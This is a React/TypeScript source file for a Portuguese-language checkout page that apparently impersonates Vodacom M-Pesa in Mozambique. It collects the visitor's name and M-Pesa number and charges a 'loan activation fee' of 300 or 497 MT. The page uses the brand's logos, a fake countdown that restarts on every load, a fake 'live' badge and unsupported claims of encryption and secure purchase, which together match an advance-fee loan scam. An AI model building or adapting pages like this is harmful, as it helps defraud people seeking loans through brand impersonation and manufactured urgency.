// @ts-nocheck
import { createFileRoute } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useMutation, useQuery } from "@tanstack/react-query";
import { getProductBySlug } from "@/lib/products.functions";
import { createCheckout, checkTransactionStatus } from "@/lib/transactions.functions";
import { Loader2, Lock, ShieldCheck, CheckCircle2, AlertTriangle, Clock } from "lucide-react";
import { useEffect, useRef, useState } from "react";
import { toast } from "sonner";

export const Route = createFileRoute("/txuna-mpesa")({
  component: TxunaCheckout,
  head: () => ({
    meta: [
      { title: "Txuna M-Pesa — Taxa de ativação de empréstimo" },
      { name: "description", content: "Ative o seu empréstimo M-Pesa em Moçambique com pagamento seguro via M-Pesa. Escolha o plano de 6 ou 12 meses." },
      { property: "og:title", content: "Txuna M-Pesa — Taxa de ativação de empréstimo" },
      { property: "og:description", content: "Pagamento seguro via M-Pesa. Planos de 6 ou 12 meses." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
});

const SLUG = "txuna-mpesa";
const PLANS = [
  { id: "6", label: "6 meses", price: 300 },
  { id: "12", label: "12 meses", price: 497 },
] as const;

const fmt = (n: number) => `${new Intl.NumberFormat("pt-MZ", { maximumFractionDigits: 0 }).format(n)} MT`;

function Countdown() {
  const [left, setLeft] = useState(11 * 60 + 5);
  useEffect(() => {
    if (left <= 0) return;
    const t = setInterval(() => setLeft((p) => (p > 0 ? p - 1 : 0)), 1000);
    return () => clearInterval(t);
  }, [left]);
  const m = Math.floor(left / 60);
  const s = left % 60;
  return <span className="tabular-nums">{String(m).padStart(2, "0")}:{String(s).padStart(2, "0")}</span>;
}

function TxunaCheckout() {
  const fetchProduct = useServerFn(getProductBySlug);
  const checkout = useServerFn(createCheckout);

  const { data: product } = useQuery({
    queryKey: ["product", SLUG],
    queryFn: () => fetchProduct({ data: { slug: SLUG } }),
    retry: false,
  });

  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [plan, setPlan] = useState<"6" | "12">("6");
  const [modal, setModal] = useState<{ status: "processing" | "pending" | "paid" | "failed"; id?: string } | null>(null);
  const checkingRef = useRef(false);

  const selectedPlan = PLANS.find((p) => p.id === plan);
  const amount = selectedPlan?.price ?? PLANS[0].price;
  const digits = phone.replace(/\D/g, "");
  const ready = name.trim().length >= 3 && digits.length === 9 && !!product?.id;

  const m = useMutation({
    mutationFn: () =>
      checkout({
        data: {
          product_id: product?.id ?? "",
          amount_mzn: amount,
          customer_name: name.trim(),
          customer_phone: `258${digits}`,
          method: "mpesa",
          tracking: { src: `txuna-${plan}m` },
        },
      }),
    onMutate: () => setModal({ status: "processing" }),
    onSuccess: (r) => {
      if (r.status === "paid") {
        setModal({ status: "paid", id: r.id });
        return;
      }
      setModal({ status: "pending", id: r.id });
      toast("Confirme o pagamento no seu telemóvel");
    },
    onError: (e) => {
      setModal({ status: "failed" });
      toast.error(e instanceof Error ? e.message : "Erro no pagamento");
    },
  });

  useEffect(() => {
    if (modal?.status !== "pending" || !modal.id) return;
    let stopped = false;
    let count = 0;
    const timer = setInterval(async () => {
      if (stopped || checkingRef.current) return;
      if (++count > 60) { clearInterval(timer); return; }
      checkingRef.current = true;
      try {
        const r = await checkTransactionStatus({ data: { transaction_id: modal.id! } });
        if (r.status === "paid") { stopped = true; clearInterval(timer); setModal({ status: "paid", id: modal.id }); }
        else if (r.status === "failed") { stopped = true; clearInterval(timer); setModal({ status: "failed", id: modal.id }); }
      } catch {}
      checkingRef.current = false;
    }, 3000);
    return () => { stopped = true; clearInterval(timer); };
  }, [modal?.status, modal?.id]);

  useEffect(() => {
    if (modal?.status !== "paid" || !modal.id) return;
    const t = setTimeout(() => { window.location.href = `/obrigado?tx_id=${modal.id}&slug=${SLUG}`; }, 1600);
    return () => clearTimeout(t);
  }, [modal?.status, modal?.id]);

  return (
    <div className="tx-page min-h-screen app-light">
      <style>{`
        @keyframes txSpin{to{transform:rotate(360deg)}}
        @keyframes txPulse{0%,100%{opacity:1}50%{opacity:.35}}
        @keyframes txUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
        .tx-page{
          --tx-red:#e60000;
          --tx-red-soft:#fff6f6;
          --tx-green:#13a873;
          --tx-mint:#76d0ae;
          --tx-ink:#101114;
          --tx-copy:#667085;
          --tx-line:#e3e7ee;
          --tx-bg:#f4f5f9;
          --tx-soft:#f6f8fb;
          background:var(--tx-bg);
          color:var(--tx-ink);
          font-family:Arial,Helvetica,sans-serif;
          letter-spacing:0;
        }
        .tx-page h1,.tx-page h2,.tx-page h3,.tx-page p{letter-spacing:0}
        .tx-card{animation:txUp .35s ease both;box-shadow:0 14px 28px rgba(24,31,45,.09)}
        .tx-logo{object-fit:contain;background:#fff}
        .tx-field::placeholder{color:#9ca3af;opacity:1}
        .tx-primary{background:var(--tx-mint);box-shadow:0 16px 26px rgba(230,0,0,.10)}
        @media (prefers-reduced-motion:reduce){.tx-card,.tx-live-dot,.tx-spinner{animation:none!important}}
      `}</style>

      {/* Header */}
      <header className="border-b border-slate-200 bg-white">
        <div className="mx-auto flex max-w-[720px] items-center gap-3 px-[22px] py-[17px] sm:gap-4 sm:px-7 sm:py-5">
          <img src="/brands/mpesa.png" alt="Logótipo M-Pesa" className="tx-logo h-10 w-10 rounded-md sm:h-12 sm:w-12" />
          <div className="flex-1 min-w-0">
            <p className="whitespace-nowrap text-[16px] font-black leading-tight text-[var(--tx-red)] sm:text-xl">
              Vodacom <span className="font-bold text-slate-400">|</span> M-Pesa
            </p>
            <p className="whitespace-nowrap text-[9px] font-bold uppercase tracking-[0.2em] text-slate-500 sm:text-[11px]">Empréstimos M-Pesa</p>
          </div>
          <span className="flex shrink-0 items-center gap-2 rounded-full bg-red-50 px-3 py-2 text-[10px] font-black tracking-[0.12em] text-[var(--tx-red)] sm:px-4 sm:text-xs">
            <span className="tx-live-dot h-2 w-2 rounded-full bg-[var(--tx-red)]" style={{ animation: "txPulse 1.4s ease-in-out infinite" }} />
            AO VIVO
          </span>
        </div>
      </header>

      <main className="mx-auto max-w-[720px] space-y-3 px-3 py-[15px] pb-10 sm:space-y-5 sm:px-6 sm:py-7 sm:pb-14">
        {/* Urgency */}
        <div className="tx-card flex h-[46px] items-center justify-center gap-2.5 rounded-2xl bg-[var(--tx-red)] px-4 text-[15px] font-black text-white sm:h-[60px] sm:rounded-3xl sm:text-lg">
          <Clock className="h-5 w-5 sm:h-6 sm:w-6" strokeWidth={2.5} />
          <span>A oferta expira em:</span>
          <strong><Countdown /></strong>
        </div>

        <div className="flex items-center justify-between px-1 text-[12px] sm:text-base">
          <span className="flex items-center gap-2 text-slate-500 font-medium">
            <span className="h-2 w-2 rounded-full bg-[var(--tx-red)] sm:h-2.5 sm:w-2.5" />
            M-Pesa Moçambique
          </span>
          <span className="flex items-center gap-1.5 font-black text-[var(--tx-green)]">
            <ShieldCheck className="h-4 w-4" /> Compra segura 🇲🇿
          </span>
        </div>

        {/* Produto */}
        <section className="tx-card flex min-h-[84px] items-center gap-4 rounded-2xl bg-white px-6 py-5 sm:min-h-[132px] sm:gap-5 sm:rounded-3xl sm:px-11 sm:py-7">
          <img src="/brands/mpesa.png" alt="M-Pesa" className="tx-logo h-12 w-12 rounded-lg sm:h-16 sm:w-16" />
          <div>
            <h1 className="text-[15px] font-black leading-snug sm:text-xl">Taxa de ativação Empréstimo</h1>
            <p className="mt-0.5 text-[12px] text-slate-500 sm:text-base">Taxa única · ID: 2500301e</p>
          </div>
        </section>

        {/* Nome */}
        <section className="tx-card space-y-3 rounded-2xl bg-white px-4 py-5 sm:space-y-4 sm:rounded-3xl sm:px-8 sm:py-7">
          <h2 className="text-[15px] font-black sm:text-xl">Nome completo</h2>
          <input
            value={name}
            onChange={(e) => setName(e.target.value)}
            placeholder="Ex: Maria Silva"
            className="tx-field h-12 w-full rounded-full border border-[var(--tx-line)] px-4 text-[16px] outline-none transition-colors focus:border-[var(--tx-red)] sm:h-16 sm:px-6 sm:text-lg"
          />
        </section>

        {/* Método */}
        <section className="tx-card space-y-4 rounded-2xl bg-white px-4 py-5 sm:space-y-5 sm:rounded-3xl sm:px-8 sm:py-8">
          <h2 className="text-[15px] font-black sm:text-xl">Método de pagamento</h2>
          <div className="flex min-h-[72px] items-center gap-4 rounded-2xl border-2 border-[var(--tx-red)] bg-[var(--tx-red-soft)] px-5 py-3 sm:min-h-[112px] sm:gap-5 sm:rounded-3xl sm:border-[3px] sm:px-8 sm:py-5">
            <img src="/brands/mpesa.png" alt="M-Pesa" className="tx-logo h-11 w-11 rounded-lg sm:h-14 sm:w-14" />
            <div className="flex-1">
              <p className="text-[15px] font-black sm:text-xl">M-Pesa</p>
              <p className="text-[12px] text-slate-500 sm:text-base">Vodacom Moçambique</p>
            </div>
            <span className="h-5 w-5 rounded-full bg-[var(--tx-red)] sm:h-7 sm:w-7" />
          </div>

          {/* Planos */}
          <h2 className="pt-1 text-[15px] font-black sm:text-xl">Plano de pagamento</h2>
          <div className="grid grid-cols-2 gap-3 sm:gap-5">
            {PLANS.map((p) => {
              const sel = plan === p.id;
              return (
                <button
                  key={p.id}
                  type="button"
                  onClick={() => setPlan(p.id)}
                  className={`min-h-[88px] rounded-2xl border-2 px-2 py-4 text-center transition-colors sm:min-h-[140px] sm:rounded-3xl sm:border-[3px] sm:py-7 ${sel ? "border-[var(--tx-red)] bg-[var(--tx-red-soft)]" : "border-[var(--tx-line)] bg-white"}`}
                >
                  <p className="text-[20px] font-black sm:text-2xl">{p.label}</p>
                  {sel ? (
                    <p className="mt-1 flex items-center justify-center gap-1.5 text-[12px] font-black text-[var(--tx-red)] sm:text-sm">
                      <CheckCircle2 className="h-4 w-4" strokeWidth={2.5} /> Selecionado
                    </p>
                  ) : null}
                </button>
              );
            })}
          </div>

          {/* Telefone */}
          <h2 className="pt-1 text-[15px] font-black sm:text-xl">Número M-Pesa</h2>
          <div className="flex items-center overflow-hidden rounded-full border border-[var(--tx-line)]">
            <span className="flex h-12 items-center bg-[var(--tx-soft)] px-4 text-[16px] font-black sm:h-16 sm:px-6 sm:text-lg">+258</span>
            <input
              value={phone}
              onChange={(e) => setPhone(e.target.value.replace(/\D/g, "").slice(0, 9))}
              inputMode="numeric"
              placeholder="84/85 + 7 dígitos"
              className="tx-field h-12 min-w-0 flex-1 px-3 text-[16px] outline-none sm:h-16 sm:px-5 sm:text-lg"
            />
          </div>

          <div className="flex gap-3 rounded-2xl bg-[var(--tx-soft)] p-4 text-[12px] leading-relaxed text-slate-500 sm:gap-4 sm:rounded-3xl sm:p-5 sm:text-base">
            <Lock className="mt-0.5 h-4 w-4 shrink-0 sm:h-5 sm:w-5" />
            <p>Protegemos os seus dados de pagamento com criptografia ponta a ponta.</p>
          </div>

          <button
            onClick={() => m.mutate()}
            disabled={!ready || m.isPending}
            className="tx-primary flex h-[48px] w-full items-center justify-center gap-2 rounded-full px-2 text-[14px] font-black text-white disabled:opacity-60 sm:h-[72px] sm:text-xl"
          >
            {m.isPending ? <Loader2 className="h-5 w-5" style={{ animation: "txSpin .8s linear infinite" }} /> : "🏆"}
            Finalizar Empréstimo — {fmt(amount)}
          </button>
        </section>

        <section className="tx-card flex min-h-[54px] items-center justify-between rounded-2xl bg-white px-4 py-3 text-[12px] sm:min-h-[72px] sm:rounded-3xl sm:px-8 sm:py-5 sm:text-base">
          <span className="flex items-center gap-2 font-black"><ShieldCheck className="h-4 w-4" /> Detalhes de segurança</span>
          <span className="flex items-center gap-2 text-slate-500">
            <Lock className="h-4 w-4" /> SSL · Imediato
          </span>
        </section>

        <p className="pb-2 text-center text-[12px] text-slate-500 sm:text-sm">
          Com tecnologia <span className="font-black text-slate-700">PayNow</span>
        </p>
      </main>

      {modal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-5" style={{ background: "rgba(15,23,42,.6)", backdropFilter: "blur(6px)" }}>
          <div className="bg-white rounded-3xl p-9 w-full max-w-sm text-center space-y-4">
            {modal.status === "paid" ? (
              <>
                <CheckCircle2 className="h-14 w-14 mx-auto" style={{ color: "#059669" }} />
                <h2 className="text-xl font-extrabold">Pagamento confirmado!</h2>
                <p className="text-sm text-slate-400">A redireccionar...</p>
              </>
            ) : modal.status === "failed" ? (
              <>
                <AlertTriangle className="h-14 w-14 mx-auto text-red-400" />
                <h2 className="text-xl font-extrabold">Pagamento falhou</h2>
                <p className="text-sm text-slate-400">Verifique o saldo e tente novamente.</p>
                <button onClick={() => setModal(null)} className="w-full h-12 rounded-full text-white font-bold" style={{ background: "#e60000" }}>
                  Tentar novamente
                </button>
              </>
            ) : (
              <>
                <Loader2 className="h-12 w-12 mx-auto" style={{ color: "#e60000", animation: "txSpin .8s linear infinite" }} />
                <h2 className="text-xl font-extrabold">A processar pagamento</h2>
                <p className="text-sm text-slate-400">Confirme o pedido no seu telemóvel M-Pesa.</p>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
